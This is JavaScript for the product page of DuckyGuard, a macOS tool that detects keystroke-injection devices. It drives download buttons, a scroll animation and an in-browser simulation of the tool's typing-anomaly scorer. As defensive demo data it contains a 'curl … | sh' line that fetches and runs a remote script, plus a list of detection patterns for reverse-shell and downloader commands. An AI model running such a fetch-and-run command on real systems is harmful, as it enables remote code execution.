/* DuckyGuard page · DOWNLOAD_URL, DOWNLOAD_NOTARIZED and SUPPORT_URL come from config.js */
document.documentElement.classList.add("js");

(() => {
  /* --- download state --- */
  if (DOWNLOAD_URL) {
    const btn = document.querySelector("[data-dl-btn]");
    btn.href = DOWNLOAD_URL; btn.textContent = "Download v2.0.0 for macOS 26+ (Apple Silicon)";
    document.querySelector("[data-dl-title]").textContent = "Download DuckyGuard";
    document.querySelector("[data-dl-copy]").textContent = "Free. Runs locally. After install, allow it in System Settings → Privacy & Security → Accessibility so it can see keystrokes.";
    document.querySelector("[data-dl-gk]").textContent = DOWNLOAD_NOTARIZED
      ? "This build is signed and notarized by Apple, so it opens normally."
      : "This build is not notarized by Apple yet. macOS will block the first launch: open System Settings → Privacy & Security and choose Open Anyway.";
    for (const sel of ["[data-dl-main]", "[data-dl-plan]"]) {
      const a = document.querySelector(sel); a.href = DOWNLOAD_URL; a.textContent = "Download free for macOS";
    }
    const s = document.querySelector("[data-dl-short]"); s.href = DOWNLOAD_URL; s.textContent = "Download";
  }
  /* --- support state --- */
  if (SUPPORT_URL) {
    const b = document.querySelector("[data-support-btn]");
    b.href = SUPPORT_URL; b.textContent = "☕ Buy me a coffee";
    document.querySelector("[data-support-note]").textContent = "Secure checkout by Stripe. You choose the amount; it doesn't unlock anything.";
  }

  const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
  const finePointer = matchMedia("(hover: hover) and (pointer: fine)").matches;

  /* --- scroll story: rogue keyboard -> shield -> sandbox (illustration) --- */
  const story = document.getElementById("story");
  if (story && !reduce) {
    story.classList.add("live");
    const PAY = "curl -s http://198.51.100.42/x.sh | sh⏎";
    const term = document.getElementById("stTerm"), box = document.getElementById("stBox"), stage = story.querySelector(".stage");
    const steps = [...story.querySelectorAll(".cap li")];
    let last = -1, ticking = false;
    function upd() {
      ticking = false;
      const r = story.getBoundingClientRect(), total = r.height - innerHeight;
      const p = Math.min(1, Math.max(0, -r.top / Math.max(total, 1)));
      const n = Math.round(Math.min(1, Math.max(0, (p - .12) / .62)) * PAY.length);
      const step = p < .12 ? 0 : n < 12 ? 1 : p < .86 ? 2 : 3;
      if (n !== last) { term.textContent = PAY.slice(0, Math.min(n, 12)); box.textContent = n > 12 ? PAY.slice(12, n) : ""; last = n; }
      stage.dataset.step = step;
      steps.forEach((li, i) => li.classList.toggle("on", i === step));
    }
    addEventListener("scroll", () => { if (!ticking) { ticking = true; requestAnimationFrame(upd); } }, { passive: true });
    addEventListener("resize", upd); upd();
  }

  /* --- mascot tilt + magnetic buttons (fine pointer only) --- */
  if (finePointer && !reduce) {
    const m = document.querySelector(".mascot");
    m.addEventListener("pointermove", e => { const r = m.getBoundingClientRect(); const x = (e.clientX - r.left) / r.width - .5, y = (e.clientY - r.top) / r.height - .5; m.style.transform = `perspective(700px) rotateY(${x * 18}deg) rotateX(${-y * 14}deg)`; });
    m.addEventListener("pointerleave", () => { m.style.transform = ""; });
    document.querySelectorAll(".mag").forEach(b => {
      b.addEventListener("pointermove", e => { const r = b.getBoundingClientRect(); b.style.transform = `translate(${(e.clientX - r.left - r.width / 2) * .12}px,${(e.clientY - r.top - r.height / 2) * .2}px)`; });
      b.addEventListener("pointerleave", () => { b.style.transform = ""; });
    });
  }

  /* --- simulation: port of KeystrokeAnomalyDetector.record_keystroke (engine settings) --- */
  const WIN = 12, RATE = 20, JIT_T = 0.014, TRIG = 0.70;
  const PATTERNS = [/curl\s+-[sSLf]*\s*http/i,/wget\s+http/i,/powershell\s+(-enc|-w\s+hidden)/i,/chmod\s+\+x/i,/\/bin\/(ba)?sh/i,/nc\s+-e/i,/base64\s+-d/i,/\/dev\/tcp\//i,/open\s+-a\s+Terminal/i];
  let hist = [], scores = [], keys = 0, fired = 0, src = "Idle";
  function score(t, ch) {
    hist.push([t, ch]); if (hist.length > WIN) hist.shift(); keys++;
    if (hist.length < WIN) return null;
    const ts = hist.map(h => h[0]); const span = Math.max(ts[ts.length-1] - ts[0], 1e-4);
    const cps = (ts.length - 1) / span; const iv = [];
    for (let i = 1; i < ts.length; i++) iv.push(ts[i] - ts[i-1]);
    const m = iv.reduce((a,b)=>a+b,0) / iv.length;
    const jit = Math.sqrt(iv.reduce((a,b)=>a+(b-m)**2,0) / (iv.length - 1));
    let sp = cps >= RATE*2 ? .40 : cps >= RATE ? .25 + .15*(cps-RATE)/RATE : cps >= 14 ? .10 : 0;
    const js = jit < .003 ? .30 : jit < .008 ? .20 : jit < JIT_T ? .10 : 0;
    if (jit >= .018) sp = Math.max(0, sp - .25);
    const txt = hist.map(h => h[1]).join("");
    const ps = PATTERNS.some(p => p.test(txt)) ? .25 : 0;
    return { cps, jit, conf: Math.min(1, sp + js + ps) };
  }
  const $ = id => document.getElementById(id);
  const rCps = $("rCps"), rJit = $("rJit"), rConf = $("rConf"), rKeys = $("rKeys"), verdict = $("verdict"), simSrc = $("simSrc");
  function reset(label) { hist = []; scores = []; keys = 0; fired = 0; src = label; simSrc.textContent = label; verdict.classList.remove("hit"); verdict.textContent = "Scoring…"; rCps.textContent = "0.0 keys/s"; rJit.textContent = "n/a"; rConf.textContent = "0.00"; rKeys.textContent = "0"; dirty = true; }
  function feed(t, ch) {
    const r = score(t, ch); rKeys.textContent = String(keys);
    if (!r) { scores.push(0); dirty = true; return; }
    scores.push(r.conf); if (scores.length > 60) scores.shift();
    rCps.textContent = r.cps.toFixed(1) + " keys/s";
    rJit.textContent = (r.jit * 1000).toFixed(1) + " ms";
    rConf.textContent = r.conf.toFixed(2);
    if (r.conf >= TRIG && !fired) {
      fired = keys; verdict.classList.add("hit");
      verdict.textContent = `Would trigger at key ${keys}. In the real app, DuckyGuard pulls focus here. The ${keys - 1} keys before this already reached the open app.`;
    } else if (!fired) {
      verdict.textContent = r.conf >= .5 ? `Suspicious but under the trigger (${r.conf.toFixed(2)} of 0.70).` : `Looks human so far (${r.conf.toFixed(2)} of 0.70).`;
    }
    dirty = true;
  }

  /* replay: timestamps are exact (synthetic); playback follows them in real time */
  let play = null;
  function replay(label, gaps, text) {
    reset(label);
    const t0 = performance.now(); let tt = 0; const sched = [];
    for (let i = 0; i < text.length; i++) { sched.push([tt, text[i]]); tt += gaps(i); }
    play = { t0, sched, i: 0, label };
  }
  const PAYLOAD = "open -a Terminal\ncurl -s http://198.51.100.42/x.sh | sh\n";
  let seed = 7; const rnd = () => (seed = (seed * 16807) % 2147483647) / 2147483647;
  $("bMachine").onclick = () => replay("Replay · even 12 ms per key", () => .012, PAYLOAD);
  $("bEven30").onclick = () => replay("Replay · even 30 ms per key", () => .030, "echo hello there friend, this is a slower even burst\n");
  $("bHuman").onclick = () => { seed = 7; replay("Replay · human typing", () => .11 + rnd() * .13, "meeting notes for thursday, bring the budget sheet"); };
  $("tb").addEventListener("keydown", e => {
    if (e.key.length !== 1 && e.key !== "Enter" && e.key !== "Backspace") return;
    if (src !== "Your typing") { play = null; reset("Your typing"); }
    feed(performance.now() / 1000, e.key.length === 1 ? e.key : e.key === "Enter" ? "\n" : "");
  });

  /* chart: redraw only when something changed */
  const cv = $("cv"), ctx = cv.getContext("2d"), thLbl = $("thLbl"); let dirty = true, W = 0, H = 0;
  function size() { const r = cv.getBoundingClientRect(), d = Math.min(devicePixelRatio || 1, 2); W = r.width; H = r.height; cv.width = Math.round(W*d); cv.height = Math.round(H*d); ctx.setTransform(d,0,0,d,0,0); dirty = true; }
  new ResizeObserver(size).observe(cv); size();
  const yOf = v => H - 12 - v * (H - 36);
  function draw() {
    ctx.clearRect(0, 0, W, H);
    const ty = yOf(TRIG); thLbl.style.top = (ty - 16) + "px";
    ctx.strokeStyle = "#B42318"; ctx.lineWidth = 1; ctx.setLineDash([4,4]);
    ctx.beginPath(); ctx.moveTo(0, ty); ctx.lineTo(W, ty); ctx.stroke(); ctx.setLineDash([]);
    const n = 60, step = W / n, bw = Math.max(2, step - 2), off = n - scores.length;
    for (let i = 0; i < scores.length; i++) {
      const v = scores[i], y = yOf(v);
      ctx.fillStyle = v >= TRIG ? "#FF6B00" : "#E8D9BF";
      ctx.fillRect((off + i) * step + 1, y, bw, H - 12 - y || 1);
    }
  }
  function frame(now) {
    if (play) {
      const el = (now - play.t0) / 1000;
      while (play && play.i < play.sched.length && play.sched[play.i][0] <= el) {
        const [t, ch] = play.sched[play.i++]; feed(1000 + t, ch);
      }
      if (play && play.i >= play.sched.length) { if (!fired) verdict.textContent += " Replay finished without a trigger."; play = null; }
    }
    if (dirty) { draw(); dirty = false; }
    requestAnimationFrame(frame);
  }
  requestAnimationFrame(frame);
})();
